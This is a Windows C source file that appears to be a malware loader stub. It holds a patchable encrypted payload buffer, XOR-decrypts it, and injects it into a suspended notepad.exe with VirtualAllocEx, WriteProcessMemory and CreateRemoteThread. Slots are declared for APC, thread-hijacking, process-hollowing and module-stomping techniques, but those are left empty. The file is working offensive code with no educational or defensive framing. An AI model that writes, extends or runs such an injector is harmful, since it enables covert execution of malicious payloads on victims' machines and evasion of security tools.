#include <windows.h>

#define PAYLOAD_MARKER 0xDEADBEEF

DWORD payload_size = PAYLOAD_MARKER;
unsigned char payload[8192];
unsigned char xor_key = 0;
unsigned char technique = 0;
char target_process[256] = "notepad.exe";

void decrypt_payload() {
	DWORD i;
	if (xor_key != 0) {
		for (i = 0; i < payload_size; i++) {
			payload[i] ^= xor_key;
		}
	}
}

void inject_create_remote_thread() {
	STARTUPINFOA si = {sizeof(si)};
	PROCESS_INFORMATION pi;
	LPVOID buf;
	HANDLE hThread;
	DWORD old;

	if (!CreateProcessA(NULL, target_process, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &si, &pi)) {
		return;
	}

	buf = VirtualAllocEx(pi.hProcess, NULL, payload_size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	if (!buf) {
		TerminateProcess(pi.hProcess, 0);
		CloseHandle(pi.hProcess);
		CloseHandle(pi.hThread);
		return;
	}

	if (!WriteProcessMemory(pi.hProcess, buf, payload, payload_size, NULL)) {
		VirtualFreeEx(pi.hProcess, buf, 0, MEM_RELEASE);
		TerminateProcess(pi.hProcess, 0);
		CloseHandle(pi.hProcess);
		CloseHandle(pi.hThread);
		return;
	}

	if (!VirtualProtectEx(pi.hProcess, buf, payload_size, PAGE_EXECUTE_READ, &old)) {
		VirtualFreeEx(pi.hProcess, buf, 0, MEM_RELEASE);
		TerminateProcess(pi.hProcess, 0);
		CloseHandle(pi.hProcess);
		CloseHandle(pi.hThread);
		return;
	}

	hThread = CreateRemoteThread(pi.hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)buf, NULL, 0, NULL);
	if (hThread) {
		CloseHandle(hThread);
	}

	ResumeThread(pi.hThread);
	CloseHandle(pi.hProcess);
	CloseHandle(pi.hThread);
}

void inject_apc() {

}

void inject_thread_hijacking() {

}

void inject_process_hollowing() {

}

void inject_module_stomping() {

}

typedef void (*InjectionFunc)();

InjectionFunc injection_techniques[] = {
	inject_create_remote_thread,
	inject_apc,
	inject_thread_hijacking,
	inject_process_hollowing,
	inject_module_stomping
};

int main() {
	decrypt_payload();
	injection_techniques[technique]();
	return 0;
}
